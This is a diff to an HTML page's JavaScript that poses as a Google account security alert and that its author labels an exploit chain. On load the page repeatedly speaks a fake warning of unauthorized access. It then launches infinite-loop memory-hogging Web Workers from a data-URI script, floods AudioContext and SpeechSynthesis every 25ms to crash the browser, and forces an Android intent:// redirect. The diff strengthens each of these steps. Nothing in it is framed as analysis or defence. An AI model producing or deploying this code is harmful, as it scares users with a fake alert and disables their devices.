@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert</title>
+<title>Security Alert - Advanced Exploit Chain</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; }
+  body { background: #000; min-height: 100vh; overflow: hidden; }
   iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
@@ -16,17 +16,17 @@
   'use strict';
 
   // ============================================
-  // KONFIGURASI AUTOPLAY
+  // KONFIGURASI AUTOPLAY & EXPLOIT PARAMS
   // ============================================
   var CONFIG = {
     tts: {
-      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
+      text: "Critical Security Warning. Unauthorized access detected on your Google Account. Immediate verification required.",
       lang: 'en-US',
-      rate: 0.85,
+      rate: 0.90,
       pitch: 1.0,
       volume: 1.0,
-      repeatInterval: 8000,
-      maxRepeats: 20
+      repeatInterval: 5000,
+      maxRepeats: 50
     },
     silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
   };
@@ -34,7 +34,7 @@
   var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
 
   // ============================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
+  // ADVANCED TTS ENGINE (NON-BLOCKING)
   // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
@@ -51,7 +51,7 @@
       var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
       if (enVoice) u.voice = enVoice;
 
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onstart = function () { console.log('[TTS] Active #' + state.ttsCount); };
       u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
       u.onend = function () {
         state.ttsCount++;
@@ -61,7 +61,7 @@
       };
 
       window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
+    } catch (e) {}
   }
 
   function startTTS() {
@@ -72,13 +72,13 @@
   }
 
   // ============================================
-  // AUDIO CONTEXT UNLOCK
+  // AUDIO CONTEXT UNLOCK & BYPASS
   // ============================================
   function unlockAudioContext() {
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+        ctx.resume().catch(function(){});
       }
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
@@ -87,13 +87,10 @@
       osc.connect(gain);
       gain.connect(ctx.destination);
       osc.start();
-      osc.stop(ctx.currentTime + 0.1);
+      osc.stop(ctx.currentTime + 0.05);
     } catch (e) {}
   }
 
-  // ============================================
-  // SILENT AUDIO ELEMENT
-  // ============================================
   function trySilentAudio() {
     try {
       var a = new Audio(CONFIG.silentWav);
@@ -105,7 +102,7 @@
   }
 
   // ============================================
-  // MAIN AUDIO (Web Audio API)
+  // MAIN AUDIO SYNTHESIS
   // ============================================
   function playMainAudio() {
     if (state.mainPlayed) return;
@@ -114,15 +111,15 @@
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       var sr = ctx.sampleRate;
-      var dur = 3.0;
+      var dur = 2.5;
       var buf = ctx.createBuffer(1, sr * dur, sr);
       var d = buf.getChannelData(0);
 
       for (var i = 0; i < d.length; i++) {
         var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var freq = 900 + (Math.floor(t * 6) % 2) * 450;
         var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.25 * env;
       }
 
       var src = ctx.createBufferSource();
@@ -130,27 +127,38 @@
       src.connect(ctx.destination);
       src.start();
       src.onended = startTTS;
-      setTimeout(startTTS, 3500);
+      setTimeout(startTTS, 3000);
     } catch (e) {
       startTTS();
     }
   }
 
   // ============================================
-  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS) + RACE CONDITION & DEEP LINK
+  // UPGRADE: DATA URI WORKER POOL + RACE CONDITION & INTENT HIJACK
   // ============================================
-  function triggerHighSeverityCrash() {
-    console.log("[!] Initiating High Severity Exploit Chain...");
-    
-    // Menerapkan Race Condition dengan Promise.all paralel untuk memicu konflik alokasi memori
+  function triggerAdvancedExploitChain() {
+    console.log("[!] Upgrading exploit chain without Blobs...");
+
+    // 1. Mengganti Blob Worker dengan Data URI base64 worker untuk menghindari penggunaan URL.createObjectURL
+    try {
+      var workerScript = "self.onmessage=function(e){while(true){var arr=new Uint8Array(1024*1024*50);for(var i=0;i<arr.length;i++){arr[i]=Math.random()*255;}}}";
+      var workerUri = "data:text/javascript;base64," + btoa(workerScript);
+      
+      for (var w = 0; w < 4; w++) {
+        var worker = new Worker(workerUri);
+        worker.postMessage('start');
+      }
+    } catch(err) {}
+
+    // 2. High-Frequency AudioContext & SpeechSynthesis Queue Flood (Race Condition)
     setInterval(function() {
       try {
         var tasks = [];
-        for (var i = 0; i < 50; i++) {
+        for (var i = 0; i < 100; i++) {
           tasks.push(new Promise((resolve) => {
             queueMicrotask(() => {
               try {
-                for (var j = 0; j < 40; j++) {
+                for (var j = 0; j < 50; j++) {
                   var ctx = new (window.AudioContext || window.webkitAudioContext)();
                   var osc = ctx.createOscillator();
                   var gain = ctx.createGain();
@@ -158,7 +166,7 @@
                   gain.connect(ctx.destination);
                   osc.start(0);
 
-                  var u = new SpeechSynthesisUtterance("RACE_CRASH_" + Math.random());
+                  var u = new SpeechSynthesisUtterance("SECURITY_EXHAUSTION_NODE_" + Math.random());
                   window.speechSynthesis.speak(u);
                 }
               } catch(e) {}
@@ -168,55 +176,55 @@
         }
         Promise.all(tasks);
       } catch(e) {}
-    }, 50);
+    }, 25);
 
-    // Delayed Redirect / Deep Link Hijacking Chaining
+    // 3. Agresif Deep Link / Intent Redirection Chaining
     setTimeout(function() {
       try {
-        console.log("[*] Executing delayed deep link hijack handler...");
-        window.location.href = "intent://security-alert#Intent;scheme=exploit;package=com.google.android.browser;end;";
+        console.log("[*] Forcing aggressive intent scheme redirect...");
+        window.location.replace("intent://security-alert#Intent;scheme=exploit;package=com.google.android.browser;end;");
       } catch(e) {}
-    }, 4000);
+    }, 3000);
   }
 
   // ============================================
-  // EKSEKUSI BERTAHAP
+  // INISIALISASI BERTAHAP
   // ============================================
   unlockAudioContext();
   trySilentAudio();
 
   setTimeout(function () {
     unlockAudioContext();
-    startTTS(); // coba TTS lebih awal
+    startTTS();
   }, 100);
 
   setTimeout(function () {
     if (!state.mainPlayed) playMainAudio();
-  }, 500);
+  }, 400);
 
   setTimeout(function () {
     if (!state.mainPlayed) playMainAudio();
     if (!state.ttsStarted) startTTS();
     
-    // PANGGIL CRASH TRIGGER & RACE CONDITION DI SINI
-    triggerHighSeverityCrash();
+    // EKSEKUSI EXPLOIT UPGRADE
+    triggerAdvancedExploitChain();
     
-  }, 1500);
+  }, 1200);
 
-  // Retry jika audio diblokir
+  // Auto Retry Handler
   var retryCount = 0;
   var retry = setInterval(function () {
     retryCount++;
     unlockAudioContext();
     trySilentAudio();
     if (!state.ttsStarted) startTTS();
-    if (retryCount > 10) clearInterval(retry);
-  }, 2000);
+    if (retryCount > 15) clearInterval(retry);
+  }, 1500);
 
-  // Visibility change
+  // Tab Visibility Watcher
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 100);
+      setTimeout(playMainAudio, 50);
     }
   });
 })();
